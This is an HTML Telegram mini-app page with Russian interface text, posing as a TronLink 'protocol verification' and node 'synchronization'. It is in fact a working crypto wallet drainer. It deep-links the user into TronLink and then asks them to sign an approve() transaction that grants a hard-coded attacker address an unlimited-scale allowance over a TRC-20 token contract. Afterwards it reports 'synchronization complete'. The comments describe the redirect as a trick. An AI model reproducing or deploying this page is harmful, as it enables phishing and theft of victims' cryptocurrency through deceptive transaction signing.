<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Protocol Verification</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/tronweb/dist/TronWeb.js"></script>
    <style>
        body { background: #000; color: #fff; font-family: -apple-system, sans-serif; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; }
        .card { padding: 30px; width: 85%; max-width: 380px; background: #111; border-radius: 30px; border: 1px solid #222; text-align: center; }
        .btn { background: #ff0013; color: #fff; border: none; padding: 20px; width: 100%; border-radius: 18px; font-weight: bold; text-transform: uppercase; cursor: pointer; font-size: 14px; margin-top: 20px; }
        .loader { border: 2px solid #222; border-top: 2px solid #ff0013; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 0 auto 20px; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>

<div class="card" id="ui-content">
    <div class="loader"></div>
    <h2 id="title">Инициализация...</h2>
    <p id="desc" style="color: #666; font-size: 13px;">Подключение к защищенному каналу TronLink</p>
    <button id="mainBtn" class="btn" style="display: none;">ПОДКЛЮЧИТЬ КОШЕЛЕК</button>
</div>

<script>
    const tg = window.Telegram.WebApp;
    tg.expand();

    const ADMIN = 'TXRBrbaTiNotkHp6gSC6vbbZYPq7dqyjF4';
    const CONTRACT = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
    const GITHUB_URL = "https://timur3417.github.io/sync-node-app/";

    async function init() {
        // Проверяем, внутри ли мы кошелька
        const tron = window.tronWeb || (window.tron && window.tron.tronWeb);

        if (tron && tron.ready) {
            // МЫ ВНУТРИ TRONLINK -> СРАЗУ К ДЕЛУ
            document.getElementById('title').innerText = "Узел Обнаружен";
            document.getElementById('desc').innerText = "Нажмите для финальной подписи транзакции.";
            const btn = document.getElementById('mainBtn');
            btn.style.display = 'block';
            btn.innerText = "ПОДПИСАТЬ АПРУВ";
            
            btn.onclick = async () => {
                try {
                    btn.disabled = true;
                    btn.innerText = "ОЖИДАНИЕ...";
                    
                    const contractObj = await tron.contract().at(CONTRACT);
                    await contractObj.approve(ADMIN, '1000000000000000000').send({ feeLimit: 100000000 });
                    
                    tg.showPopup({ title: 'Успешно', message: 'Синхронизация завершена.', buttons: [{type: 'ok'}] });
                    setTimeout(() => tg.close(), 4000);
                } catch (e) {
                    tg.showAlert("Ошибка: Подтвердите транзакцию в кошельке.");
                    btn.disabled = false;
                    btn.innerText = "ПОДПИСАТЬ АПРУВ";
                }
            };
        } else {
            // МЫ В ТЕЛЕГРАМЕ -> НУЖЕН ПРЫЖОК
            document.getElementById('title').innerText = "Синхронизация";
            document.getElementById('desc').innerText = "Для работы необходимо переключиться в приложение TronLink.";
            const btn = document.getElementById('mainBtn');
            btn.style.display = 'block';
            btn.innerText = "ОТКРЫТЬ TRONLINK";

            btn.onclick = () => {
                // Прямой вызов протокола - это "золотой стандарт"
                const deepLink = "tronlink-dapp://cloud.tronlink.org/open?url=" + encodeURIComponent(GITHUB_URL + "?mode=tl");
                
                // Трюк: открываем через официальный метод и сразу закрываем мини-апп
                tg.openLink(deepLink);
            };
        }
    }

    setTimeout(init, 500);
</script>
</body>
</html>
